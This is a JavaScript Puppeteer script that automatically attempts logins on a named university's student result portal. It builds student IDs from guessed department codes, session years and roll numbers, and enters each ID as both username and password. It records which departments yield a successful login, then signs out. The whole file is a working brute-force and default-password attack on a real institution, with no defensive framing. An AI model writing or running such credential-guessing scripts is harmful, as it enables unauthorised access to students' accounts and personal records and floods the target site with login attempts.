const puppeteer = require("puppeteer");
const fs = require("fs");

// --- Configuration ---
const baseUrl = "https://nubtkhulna.ac.bd/ter";
const years = [16, 17, 18, 19, 20]; // 16 to 20
const terms = ["01", "03"];
const rollEnd = 20;
const resultsFilePath = "found_departments.json";

// --- Helper function to retry failed operations ---
const retry = async (fn, retries = 2, delay = 1500) => {
    for (let i = 0; i < retries; i++) {
        try {
            return await fn();
        } catch (err) {
            if (i === retries - 1) throw err;
            await new Promise(res => setTimeout(res, delay));
        }
    }
};

// --- Main function ---
(async () => {
    console.log("🚀 Script starting...");
    const browser = await puppeteer.launch({ headless: true });
    console.log("✅ Browser launched.");

    let foundDepartments = [];
    // Load previous results if the file exists
    if (fs.existsSync(resultsFilePath)) {
        foundDepartments = JSON.parse(fs.readFileSync(resultsFilePath, "utf-8"));
        console.log(`✅ Loaded ${foundDepartments.length} previously found departments from ${resultsFilePath}.`);
    } else {
        console.log("📄 No previous results file found. Starting fresh.");
    }

    // Labeled loop to allow breaking out and continuing to the next department
    departmentLoop:
    for (let i = 97; i <= 122; i++) { // a-z
        for (let j = 97; j <= 122; j++) { // a-z
            for (let k = 97; k <= 122; k++) { // a-z
                const department = (String.fromCharCode(i) + String.fromCharCode(j) + String.fromCharCode(k)).toUpperCase();

                if (foundDepartments.some(d => d.department === department)) {
                    console.log(`⏭️  Skipping already found department: ${department}`);
                    continue;
                }

                console.log(`\n🔎 Searching department: ${department}`);

                for (const year of years) {
                    for (const term of terms) {
                        const session = `${year}${term}`;
                        console.log(`  -> Checking session: ${session}`);

                        for (let roll = 1; roll <= rollEnd; roll++) {
                            const rollCode = `20${String(roll).padStart(3, "0")}`;
                            const userId = `${department}${session}${rollCode}`;
                            
                            // This log will be very frequent
                            console.log(`    - Attempting ID: ${userId}`);
                            
                            const page = await browser.newPage();
                            await page.setDefaultNavigationTimeout(15000); // 15-second timeout

                            try {
                                console.log(`      ➡️  Navigating to login page...`);
                                await retry(() => page.goto(`${baseUrl}/login`, { waitUntil: "domcontentloaded" }));

                                console.log(`      ⌨️  Typing credentials...`);
                                await page.type("#username", userId);
                                await page.type("#password", userId);

                                console.log(`      🖱️  Clicking submit...`);
                                await Promise.all([
                                    page.click("button[type=submit]"),
                                    page.waitForNavigation({ waitUntil: "domcontentloaded" })
                                ]);

                                if (page.url().includes("panel")) {
                                    console.log(`      🎉 SUCCESS! Department '${department}' is valid (ID: ${userId})`);
                                    
                                    foundDepartments.push({ department });
                                    fs.writeFileSync(resultsFilePath, JSON.stringify(foundDepartments, null, 2));
                                    console.log(`      💾 Saved to ${resultsFilePath}.`);
                                    
                                    await page.goto(`${baseUrl}/login/signout`, { waitUntil: "domcontentloaded" });
                                    await page.close();

                                    continue departmentLoop;
                                } else {
                                     // This case is unlikely to be hit if the promise resolves without error,
                                     // but we log it just in case.
                                     console.log(`      ❌ Failed (Incorrect credentials).`);
                                }
                            } catch (error) {
                                console.log(`      ❌ Failed (Timeout or navigation error).`);
                            } finally {
                                if (!page.isClosed()) {
                                    console.log(`      📄 Closing page.`);
                                    await page.close();
                                }
                            }
                        } 
                    } 
                } 
                 console.log(`🤷 No students found for ${department} in any session. Moving on.`);
            }
        }
    }

    console.log("✅ Closing browser...");
    await browser.close();

    console.log("\n\n--- ✨ DISCOVERY COMPLETE ✨ ---");
    console.log("Found the following valid departments:");
    console.table(foundDepartments);
    console.log(`Final results are saved in ${resultsFilePath}`);
})();